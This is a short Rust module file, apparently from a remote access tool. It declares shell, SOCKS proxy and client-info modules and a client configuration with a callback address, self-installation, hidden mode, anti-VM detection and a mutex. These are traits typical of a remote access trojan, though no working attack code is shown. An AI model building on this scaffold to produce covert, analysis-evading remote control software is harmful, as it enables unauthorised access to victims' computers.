use serde::{ Serialize, Deserialize };

pub mod connection;
pub mod packets;
pub mod shell;
pub mod socks;
pub mod convert;
pub mod client_info;

pub const RSA_BITS: usize = 1024;
pub const ENC_TOK_LEN: usize = 32;
pub const SECRET_LEN: usize = 32;
pub const NONCE_LEN: usize = 24;

#[derive(Serialize, Deserialize, Clone, Debug)]
pub struct ClientConfig {
    pub ip: String,
    pub port: String,
    pub group: String,

    pub install: bool,
    pub file_name: String,
    pub install_folder: String,
    pub enable_hidden: bool,
    pub anti_vm_detection: bool,

    pub mutex_enabled: bool,
    pub mutex: String,

    pub unattended_mode: bool,
}